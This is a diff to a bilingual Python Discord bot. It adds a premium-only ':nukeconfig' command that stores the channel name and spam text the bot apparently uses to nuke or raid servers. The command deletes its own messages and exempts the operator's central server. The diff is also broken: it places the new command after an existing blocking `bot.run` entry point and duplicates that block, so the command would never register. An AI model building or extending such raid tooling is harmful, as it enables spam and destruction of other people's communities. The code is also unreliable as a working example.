@@ -139,3 +139,35 @@ if __name__ == "__main__":
         bot.run(TOKEN)
     else:
         print("ERROR: TOKEN NOT CONFIGURED / TOKEN NO CONFIGURADO")
+@bot.command(name='nukeconfig')
+@is_premium()
+async def nuke_config(ctx, *, args: str = None):
+    if ctx.guild.id == CENTRAL_SERVER_ID: return
+    if not args or "," not in args:
+        embed = discord.Embed(title="SYNTAX ERROR / ERROR DE SINTAXIS", description="Usage / Uso: :nukeconfig name, text", color=0x2b2d31)
+        await ctx.send(embed=embed, delete_after=10)
+        return
+
+    channel_name, spam_text = [x.strip() for x in args.split(",", 1)]
+    if not channel_name or not spam_text: return
+
+    global PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT
+    PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT = channel_name, spam_text
+    
+    try: await ctx.message.delete()
+    except: pass
+
+    embed = discord.Embed(title="CONFIGURATION UPDATED / CONFIGURACION ACTUALIZADA", color=0x2b2d31)
+    embed.add_field(name="Channels / Canales", value=f"`{channel_name}`", inline=True)
+    embed.add_field(name="Text / Texto", value=f"```{spam_text}```", inline=False)
+    
+    confirmation_msg = await ctx.send(embed=embed)
+    await asyncio.sleep(15)
+    try: await confirmation_msg.delete()
+    except: pass
+
+if __name__ == "__main__":
+    if TOKEN:
+        bot.run(TOKEN)
+    else:
+        print("ERROR: TOKEN NOT CONFIGURED / TOKEN NO CONFIGURADO")
